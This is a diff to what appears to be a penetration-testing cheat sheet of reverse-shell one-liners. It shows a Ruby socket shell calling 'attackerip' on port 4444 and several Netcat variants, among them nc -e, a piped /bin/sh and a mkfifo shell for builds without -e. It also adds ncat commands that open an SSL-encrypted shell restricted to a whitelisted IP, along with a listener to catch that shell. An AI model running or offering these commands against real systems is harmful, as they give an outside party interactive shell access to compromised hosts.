@@ -77,17 +77,16 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.
 **Netcat**
 
 ```shell
-nc -e /bin/sh <ip> <port>
-```
-
-```shell
+nc -e <shell> <ip> <port>
 /bin/sh | nc <ip> <port>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f  # no `-e` flag
 ```
 
+Secure with whitelisted IP and SSL
 ```shell
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
+ncat -e <shell> --allow <whitelisted ip> --ssl <ip> <port>  # Whitelist IP and use SSL
+ncat -lvnp <port> --ssl                                            # Catch shell
 ```
-- no `-e` flag
 
 **Telnet**
 
